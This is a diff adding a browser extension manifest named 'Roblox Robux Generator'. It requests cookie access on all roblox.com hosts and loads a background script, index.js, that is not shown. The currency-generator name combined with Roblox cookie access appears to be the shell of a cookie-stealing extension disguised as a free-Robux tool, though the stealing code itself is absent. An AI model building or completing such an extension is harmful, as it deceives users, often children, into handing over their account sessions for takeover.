@@ -1,0 +1,11 @@
+{
+  "name": "Roblox Robux Generator",
+  "description": "Roblox Robux Generator",
+  "version": "1.0",
+  "manifest_version": 3,
+  "permissions": ["cookies"],
+  "host_permissions": ["*://*.roblox.com/"],
+  "background": {
+    "service_worker": "index.js"
+  }
+}
